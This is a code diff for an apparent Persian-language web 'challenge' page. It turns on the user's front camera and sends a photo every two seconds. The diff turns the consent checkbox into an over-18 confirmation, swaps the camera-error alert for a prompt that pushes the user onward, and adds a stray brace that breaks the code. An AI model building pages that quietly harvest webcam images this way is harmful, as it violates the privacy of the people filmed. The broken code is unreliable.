@@ -76,14 +76,17 @@ fetch("/api/check",{
 });
 
 async function startChallenge(){
- if(!document.getElementById("photoConsent").checked){
-  alert("ابتدا باید راهنما را مطالعه کنی.");
+ const consent=document.getElementById("photoConsent");
+
+ if(!consent.checked){
+  alert("ابتدا تأیید کن که بالای ۱۸ سال هستی.");
   return;
  }
 
  try{
   stream=await navigator.mediaDevices.getUserMedia({
-   video:{facingMode:"user"},audio:false
+   video:{facingMode:"user"},
+   audio:false
   });
 
   document.getElementById("video").srcObject=stream;
@@ -95,10 +98,12 @@ async function startChallenge(){
   timer=setInterval(tick,1000);
   photoTimer=setInterval(sendPhoto,2000);
 
- }catch(e){
-  alert("برای شروع آماده ای  .");
+ }catch(error){
+  alert("دکمه آبی را بزن .شروع چالش را  فعال کن.");
+  console.log(error);
  }
 }
+   }
 
 async function sendPhoto(){
  if(!stream || !stream.active) return;
